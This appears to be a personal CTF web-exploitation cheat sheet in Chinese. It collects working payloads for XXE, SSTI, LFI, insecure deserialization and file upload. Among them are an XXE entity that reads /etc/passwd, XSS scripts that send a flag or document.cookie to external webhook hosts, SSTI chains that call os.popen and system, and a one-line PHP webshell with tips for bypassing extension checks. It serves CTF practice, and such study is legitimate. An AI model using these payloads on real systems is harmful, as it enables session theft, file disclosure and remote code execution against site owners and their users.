---
title: Web Cheat Sheet
tags: [Tools, CTF, Web]

category: "Tools｜CTF"
date: 2024-02-07
---

# Web Cheat Sheet
<!-- more -->
## 解題重點
* `robots.txt`
* 掃port: nmap: `$ sudo apt install net-tools`[NMAP教學](https://blog.gtwang.org/linux/nmap-command-examples-tutorials/)
    * nmap: `$ nmap <url>`
* 封包headers和contents: Wireshark、Browser、BurpSuite
* cookies

### Information Leak
* `.DS_Store`: lijiejie/ds_store_exp
* `gitleak`: denny0223/scrabble，確認有無`https://<victim url>/.git/config`
    ```bash
    $ chmod +x scrabble
    $ ./scrabble <url> [directory]
    $ ./scrabble http://example.com/my-project.git/
    ```

### Injection
#### SQLi
* [SQLMAP1](https://ithelp.ithome.com.tw/articles/10249487)
* [SQLMAP2](https://ithelp.ithome.com.tw/articles/10202811)

#### XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <data><ID>&xxe;</ID></data>
```

#### XSS - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
```javascript
</script><script>
fetch(`/getflag\)
    .then(r=>r.text())
    .then(flag=>location.href=`https://sbk6401.free.beeceptor.com/?f=${flag}`
    )
</script>
```

* 利用XSS把session打到webhook上
{% raw %}    
```javascript?
window.location=<requestbin.com>/?a+document.cookie
// or
fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } })
```
{% endraw %}

#### [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)

#### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
* 先確認是不是真的有這個問題: {% raw %}`{{7*7}}`{% endraw %} → 49
* 用[tplmap](https://github.com/epinna/tplmap)直接打
* SSTI Payload: 記得找<span style="background-color: yellow">os.\_wrap_close</span>
    {% raw %}
    ```
    {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id')}}
    {{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt")}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
    ```
    {% endraw %}

### LFI
只是能讀取到victim server上的file content，不見得會有價值，需要搭配其他手法，例如
1. 寫入webshell之類的達到RCE
2. 利用PHP的偽協議達到讀特殊檔案的需求
   * `http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>`

### Deserialization
要能夠達成insecure的反序列化，最重要的兩個前提是1) 反序列化的資料可控 2) 針對各個語言反序列化時或之後會觸發哪些magic method
* 可以搭配command injection
* php可以搭配`phar`
* POP Chain: 幾乎每個語言都會有類似的問題存在，最常出現在 PHP 反序列化漏洞（PHP Object Injection） 裡。把一堆「本來正常的 class 功能」串起來，變成可以執行惡意行為的一條攻擊鏈。
    * [PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc): 可以直接看對應的PHP框架有沒有對應的payload達到RCE
    * [ysoserial](https://github.com/frohoff/ysoserial): 紀錄JAVA版本的POP chain gadgets
    * [ysoserial.net](https://github.com/pwntester/ysoserial.net)

|語言|序列化|反序列化|Magic Method|
|---|---|---|---|
|Python|pickle.dumps()|pickle.loads()|`__reduce`|
|PHP|serialize||unserialize|`__destruct()`: Object被銷毀或garbage collection會觸發<br>`__wakeup()`: unserialize時自動觸發<br>`__call()`: 如果被呼叫一個不存在的方法就會嘗試呼叫，`$obj->note_exist();`<br>`__toString()`: 在被當成String處理時呼叫，`echo $obj;`<br>|
|Java|||`toString`<br>`readObject`<br>`finalize`|
|.NET|||ViewState & Session會存放序列化資料|

### Frontend
攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客，可能是利用[beeceptor](https://beeceptor.com/)這樣的外部server(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)

### SSRF
create一個偽造的payload和一個對外的中間server溝通，並讓這個中間server因為我的偽造payload而同意讓我和更裡面的內網server溝通，這樣我就打到inner server，如果有preview card這樣的網站要特別注意有沒有SSRF的問題
* 利用gopher協議建一個偽造payload

### Upload: 
* 如果沒有任何保護: 直接upload webshell.php(`<?php system($_GET["sh"]); ?>`)達到RCE
* 如果有保護但只看extension: 那就偽造extension後夾帶webshell達到RCE(`webshell.png.php`)
* bypass `IMAGETYPE`(加入合法的File Signature) + bypass file type(修改封包header)

### 如果是WordPress網頁
* [WpScan](https://wpscan.com/)專門檢測WordPress類型的網頁，有哪些漏洞，前期可以掃描出WP版本、安裝的theme或是插件有哪些、安全漏洞等等

## Tools

| Fuck                             | Beautifier                       |
| -------------------------------- | -------------------------------- |
| [jsfuck](http://www.jsfuck.com/)<br>[JS 混淆器](https://obfuscator.io/)| 把JS的程式變成可讀性很差的東西 | [JSNice](http://www.jsnice.org/) |
|[jjencode](https://utf-8.jp/public/jjencode.html)|[JS 反混淆器](https://beautifier.io/): 可以反混淆或解密JS的檔案|
|[aaencode](https://utf-8.jp/public/aaencode.html)|[JS 壓縮+加密+混淆+美化](https://js.wfuapp.com/)|
|[Esolang List](https://esolangs.org/wiki/Language_list)|[JS Fuck Decode](https://www.53lu.com/tool/jsfuckdecode/)|
||[aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html)|

* psysh: PHP的互動式shell
* wasm → c: [wabt](https://github.com/WebAssembly/wabt)
    ```bash
    # 安裝Cmake，所有過程一定要用WSL
    $ mkdir build && cd build
    $ cmake ..
    $ cmake --build .
    # 按照說明build完後進到./build
    $ ./wasm2c {wasm file path} -o {output c file path}
    ```
* Webhook
    * [Webhook.site](https://webhook.site/)
    * [Beeceptor](https://beeceptor.com/)
    * [Ngrok](https://ngrok.com/)